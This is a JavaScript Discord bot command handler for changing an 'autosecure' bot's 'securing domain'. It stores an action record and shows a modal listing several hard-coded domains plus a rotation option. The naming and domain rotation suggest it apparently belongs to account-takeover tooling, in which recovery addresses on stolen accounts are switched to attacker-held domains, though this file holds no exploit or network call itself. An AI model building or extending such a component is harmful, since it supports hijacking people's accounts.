const generate = require("../../../autosecure/utils/generate");
const { queryParams } = require("../../../db/database");
const modalBuilder = require("../../../autosecure/utils/utils/modalBuilder");
const { TextInputStyle } = require('discord.js');
const config = require("../../../config.json");

module.exports = {
    name: "changedomainautosecure",
    editautosecure: true,
    callback: async (client, interaction) => {
        let [t, botnumber, ownerid] = interaction.customId.split("|");
        let actionId = generate(32);
        await queryParams(
            `INSERT INTO actions (id, action) VALUES (?, ?)`,
            [actionId, `modalchangedomain|${botnumber}|${ownerid}`]
        );

        let customModalId = `action|${actionId}`;

        const settings = await queryParams(`SELECT domain FROM autosecure WHERE user_id=? AND botnumber=?`, [ownerid, botnumber]);
        let currentDomain = (settings && settings[0] && settings[0].domain) || "Rotate (4 Domains)";
        if (currentDomain.includes('thapcamstore') || currentDomain.trim() === '') {
            currentDomain = "Rotate (4 Domains)";
        }

        const validDomains = (config.domains && config.domains.length > 0)
            ? config.domains.join(" | ")
            : "mail.hotwar.asia | hotwar.top | donuttsmp.store | ryuuu.xyz";

        interaction.showModal(modalBuilder(
            customModalId,
            `Change Securing Domain`,
            [
                {
                    setCustomId: 'domain',
                    setRequired: true,
                    setLabel: `Domain ('Rotate' or 1 of 4 domains)`.slice(0, 45),
                    setValue: currentDomain,
                    setPlaceholder: `Type 'Rotate' or: ${validDomains}`.slice(0, 100),
                    setMaxLength: 64,
                    setStyle: TextInputStyle.Short
                }
            ]
        ));
    }
};
